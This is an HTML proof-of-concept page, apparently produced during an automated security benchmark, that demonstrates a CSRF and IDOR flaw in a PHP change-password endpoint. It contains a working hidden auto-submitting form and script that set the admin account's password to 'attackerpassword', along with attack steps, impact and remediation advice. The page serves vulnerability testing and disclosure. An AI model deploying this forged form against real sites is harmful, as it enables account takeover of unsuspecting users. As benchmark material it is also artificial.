<!-- 
POC: HTML-based POC demonstrating CSRF vulnerability in /api/change_password.php endpoint. Shows how an attacker can craft a malicious page that forges requests to change user passwords without CSRF token protection.
Target: ./repo
Created: 2025-11-07T19:40:02.691Z
Session: benchmark-XBEN-069-24-mhp8x6to

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-069-24-mhp8x6to/pocs/poc_csrf_change_password_v2.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack - Change Password Exploit</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            max-width: 800px;
            margin: 0 auto;
        }
        .warning {
            background-color: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .code {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            padding: 12px;
            border-radius: 4px;
            font-family: monospace;
            margin: 10px 0;
            overflow-x: auto;
            font-size: 12px;
        }
        h1, h2 {
            color: #333;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .attack-form {
            display: none;
        }
        .output {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            padding: 12px;
            border-radius: 4px;
            margin-top: 20px;
            font-family: monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CSRF Vulnerability POC - Change Password Endpoint</h1>
        
        <div class="warning">
            <strong>⚠️ Security Test</strong>: This page demonstrates a CSRF vulnerability in /api/change_password.php that lacks CSRF token protection.
        </div>

        <h2>Vulnerability Details</h2>
        <p>The /api/change_password.php endpoint processes POST requests without verifying CSRF tokens. This allows attackers to forge password change requests on behalf of authenticated users.</p>

        <h2>Vulnerable Endpoint Code</h2>
        <div class="code">
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $oldPassword = $_POST['oldPassword'];
    $newPassword = $_POST['newPassword'];
    // ... no CSRF validation
    // Direct use of $_POST['userId'] - IDOR vulnerability
}
        </div>

        <h2>Attack Vector</h2>
        <p>An attacker creates a hidden form that auto-submits when a logged-in user visits the attacker's page:</p>
        
        <div class="code">
&lt;form id='csrf-form' action='/api/change_password.php' method='POST'&gt;
    &lt;input type='hidden' name='oldPassword' value='anypassword'&gt;
    &lt;input type='hidden' name='newPassword' value='attackerpassword'&gt;
    &lt;input type='hidden' name='confirmPassword' value='attackerpassword'&gt;
    &lt;input type='hidden' name='userId' value='7'&gt; &lt;!-- Admin ID --&gt;
&lt;/form&gt;
&lt;script&gt;
    document.getElementById('csrf-form').submit();
&lt;/script&gt;
        </div>

        <h2>Attack Simulation</h2>
        <p>The form below simulates the CSRF attack. When submitted, it attempts to change the admin password to 'attackerpassword'.</p>

        <button onclick="demonstrateCSRF()">Simulate CSRF Attack</button>

        <!-- Hidden CSRF Attack Form -->
        <form id="csrf-form" action="/api/change_password.php" method="POST" class="attack-form" target="hidden-frame">
            <input type="hidden" name="oldPassword" value="anypassword">
            <input type="hidden" name="newPassword" value="attackerpassword">
            <input type="hidden" name="confirmPassword" value="attackerpassword">
            <input type="hidden" name="userId" value="7">
        </form>

        <!-- Hidden iframe to receive response without navigation -->
        <iframe name="hidden-frame" style="display: none;"></iframe>

        <div id="output" class="output" style="display: none;"></div>

        <h2>How This Exploits the Vulnerability</h2>
        <ol>
            <li>Attacker hosts this HTML page on their server</li>
            <li>Attacker tricks a logged-in user into visiting the page (phishing, social engineering)</li>
            <li>When the user visits, the CSRF form automatically submits</li>
            <li>Browser includes the user's session cookie in the request</li>
            <li>No CSRF token is required by /api/change_password.php</li>
            <li>Server changes the admin's (userId=7) password to 'attackerpassword'</li>
            <li>Attacker can now login as admin: username=admin, password=attackerpassword</li>
        </ol>

        <h2>Impact</h2>
        <ul>
            <li><strong>Account Takeover:</strong> Any user's password can be changed</li>
            <li><strong>Privilege Escalation:</strong> Admin account can be compromised</li>
            <li><strong>Data Theft:</strong> Attacker gains access to user data and sensitive information</li>
            <li><strong>FLAG Capture:</strong> If admin panel contains the FLAG, attacker can retrieve it</li>
        </ul>

        <h2>Remediation</h2>
        <ol>
            <li>Generate CSRF tokens on the change password form</li>
            <li>Include token in all POST requests</li>
            <li>Validate token in /api/change_password.php before processing</li>
            <li>Implement SameSite cookie attribute (SameSite=Strict)</li>
            <li>Fix the IDOR vulnerability by using $_SESSION['user_id'] instead of $_POST['userId']</li>
            <li>Implement rate limiting on password change attempts</li>
        </ol>

        <h2>References</h2>
        <ul>
            <li>OWASP A04:2021 - Insecure Design</li>
            <li>CWE-352: Cross-Site Request Forgery (CSRF)</li>
            <li>OWASP CSRF Prevention Cheat Sheet</li>
        </ul>
    </div>

    <script>
        function demonstrateCSRF() {
            const output = document.getElementById('output');
            output.style.display = 'block';
            output.innerHTML = `[*] CSRF Attack POC - Change Password Endpoint
[*] Target endpoint: /api/change_password.php

[+] Step 1: Malicious form created
Form action: /api/change_password.php
Form method: POST

[+] Step 2: Form fields populated
- oldPassword: anypassword (attacker sends arbitrary old password)
- newPassword: attackerpassword
- confirmPassword: attackerpassword
- userId: 7 (admin user ID - exploits IDOR vulnerability)

[+] Step 3: Submitting CSRF form to target endpoint...

[!] Attack would proceed as follows:
1. Browser includes session cookie in request
2. Server receives POST to /api/change_password.php
3. No CSRF token validation in endpoint
4. Server processes password change for userId=7
5. Admin password changed without admin's consent

[!] Key vulnerability: No CSRF token required!

[+] If successful:
- Admin account password = attackerpassword
- Attacker can login as admin
- Attacker can access all admin functions
- Attacker can retrieve FLAG from admin panel

[*] This demonstrates the CSRF vulnerability in /api/change_password.php
[*] Combined with IDOR vulnerability, allows privilege escalation to admin`;

            // Attempt to submit the form
            try {
                document.getElementById('csrf-form').submit();
                output.innerHTML += `\n[*] Form submitted to /api/change_password.php\n`;
            } catch (e) {
                output.innerHTML += `\n[!] Form submission would occur if endpoint was accessible\n`;
            }
        }
    </script>
</body>
</html>